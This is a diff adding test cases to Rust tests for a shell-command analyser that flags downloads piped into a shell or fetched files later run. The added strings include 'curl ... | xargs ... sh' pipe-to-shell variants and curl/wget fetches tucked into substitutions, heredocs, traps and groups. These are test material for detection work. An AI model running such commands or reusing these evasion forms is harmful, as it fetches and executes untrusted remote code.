@@ -1365,6 +1365,10 @@ fn xargs_hands_a_pipe_to_a_shell_past_its_options_and_wrappers() {
         "curl https://x.example/a | xargs -P 4 -n 1 bash",
         "curl https://x.example/a | xargs -0n 1 sh",
         "curl https://x.example/a | xargs -In sh",
+        "curl https://x.example/a | xargs -i {} sh -c '{}'",
+        "curl https://x.example/a | xargs -i pkg sh -c 'install pkg'",
+        "curl https://x.example/a | xargs -l 1 sh",
+        "curl https://x.example/a | xargs -p 4 -n 1 bash",
         "curl https://x.example/a | xargs -pn 1 sh",
         "curl https://x.example/a | xargs -d '\\n' sh",
         "curl https://x.example/a | xargs --max-args 1 sh",
@@ -1388,6 +1392,11 @@ fn xargs_hands_a_pipe_to_a_shell_past_its_options_and_wrappers() {
         "curl https://x.example/a | xargs -I{} rm {}",
         "curl https://x.example/a | xargs -t echo",
         "curl https://x.example/a | xargs -0 -r basename -a sh",
+        // In lower case `-i`, `-l` and `-p` take the next word only where
+        // it can be their value.
+        "curl https://x.example/a | xargs -i echo sh",
+        "curl https://x.example/a | xargs -l echo sh",
+        "curl https://x.example/a | xargs -p echo sh",
         "curl https://x.example/a | xargs -n 1 sudo rm -f",
     ] {
         assert!(
@@ -1463,6 +1472,32 @@ fn a_command_in_a_substitution_is_read_without_what_closes_it() {
         fetched_files("echo \"it's $(curl -o f.sh https://x.example/f.sh)\""),
         ["f.sh"]
     );
+    // Text handed to a shell in other ways is read too.
+    for line in [
+        "bash -lc 'x=$(curl -o f.sh https://x.example/f.sh)'",
+        "sh -ec 'x=`curl -o f.sh https://x.example/f.sh`'",
+        "echo 'x=$(curl -o f.sh https://x.example/f.sh)' | sh",
+        "sudo -u u sh <<< 'x=$(curl -o f.sh https://x.example/f.sh)'",
+        "trap 'x=$(curl -o f.sh https://x.example/f.sh)' EXIT",
+        // A quote inside a substitution is that substitution's own.
+        "x=\"$(echo \"it's\")\" y=\"$(curl -o f.sh https://x.example/f.sh)\"",
+        "echo \"$(echo \"don't\")\" \"$(curl -o f.sh https://x.example/f.sh)\"",
+        "echo $'a\\'b' \"$(curl -o f.sh https://x.example/f.sh)\"",
+        "echo \"`echo \"it's\"`\" \"$(curl -o f.sh https://x.example/f.sh)\"",
+        // A group.
+        "(curl -o f.sh https://x.example/f.sh)",
+        "(sudo wget https://x.example/f.sh)",
+        "{ curl -fsSL https://x.example/a -o f.sh; }",
+        "(cd /tmp && curl -O https://x.example/f.sh)",
+    ] {
+        assert_eq!(fetched_files(line), ["f.sh"], "{line}");
+    }
+    for line in [
+        "echo \"$(echo 'a $(curl -o f.sh https://x.example/f.sh)')\"",
+        "msg 'a (b) $(curl -o f.sh https://x.example/f.sh)'",
+    ] {
+        assert!(fetched_files(line).is_empty(), "{line}");
+    }
     // What is piped into a shell inside one is run.
     assert_eq!(run_targets("x=$(cat f | sh) ls"), ["f"]);
     assert_eq!(run_targets("x=\"$(sh i.sh)\""), ["i.sh"]);
